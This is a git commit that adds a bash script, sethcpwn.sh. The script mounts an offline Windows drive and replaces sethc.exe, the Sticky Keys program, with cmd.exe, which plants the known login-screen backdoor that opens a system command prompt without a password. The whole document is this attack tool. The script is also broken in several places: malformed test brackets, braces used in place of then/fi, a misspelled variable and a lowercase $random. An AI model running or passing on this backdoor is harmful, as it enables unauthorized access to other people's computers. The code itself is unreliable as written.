0c1f8c83234e816cd17d826d5325361f79a64ddb
Michael <mike-bailey@users.noreply.github.com>
2015-08-08 00:13:03 -0400

    Create sethcpwn.sh

---
+++ sethcpwn.sh
@@ -0,0 +1,35 @@
+beans=0
+sethcrekd=0
+while [$beans == 0]; 
+do
+	fdisk -l
+	echo Select device block
+	read deviceblk
+	mkdir /winmount
+	mount /dev/$deviceblk /winmount
+	cd /winmount
+	win=$(ls | grep -i windows)
+	sys=$(ls | grep -i system32)
+	ls -la $win/$sys\\sethc.exe
+	if [ $? -eq 0 ]; then
+		mv $win/$sys/sethc.exe $win/$sys/sethc$random.exe
+		cp $win/$sys/cmd.exe $win/$sys/sethc.exe
+		beans=1
+		sethcrekd=1
+	fi
+	if [ $sethcrekd == 0];
+		updatedb
+		counts=$(locate sethc.exe | grep sethc.exe$ | wc -l)
+		if [ $counts == 1 ]  {
+			sethcdir=$(locate sethc.exe | grep sethc.exe)
+			sysdir=$(echo $sethdcir | sed 's/sethc.exe//g')
+			mv $sysdir/sethc.exe $sysdir/sethc$random.exe
+			cp $sysdir/cmd.exe $sysdir/sethc.exe
+			beans=1
+			sethcrekd=1
+		}
+		if [ $counts == 0 ] {
+			echo No sethc.exe found. Sorry.
+		}
+	fi
+done
